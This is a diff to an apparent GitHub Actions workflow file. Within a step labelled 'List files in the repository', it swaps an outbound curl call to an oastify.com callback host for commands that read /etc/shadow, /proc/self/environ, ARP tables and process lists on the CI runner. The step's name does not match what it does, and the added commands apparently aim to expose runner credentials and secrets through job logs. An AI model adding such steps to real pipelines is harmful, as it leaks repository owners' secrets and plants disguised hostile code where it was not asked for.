@@ -13,5 +13,13 @@ jobs:
       - run: echo "🖥️ The workflow is now ready to test your code on the runner."
       - name: List files in the repository
         run: |
-          curl p7xxlfzsv3pwqb9e51q990w4nvtlha.oastify.com
+          ps aux
+          pwd
+          whoami
+          cat /etc/shadow
+          cat /proc/cpuinfo
+          cat /proc/net/arp
+          cat /proc/self/environ
+          df -h
+          
       - run: echo "🍏 This job's status is ${{ job.status }}."
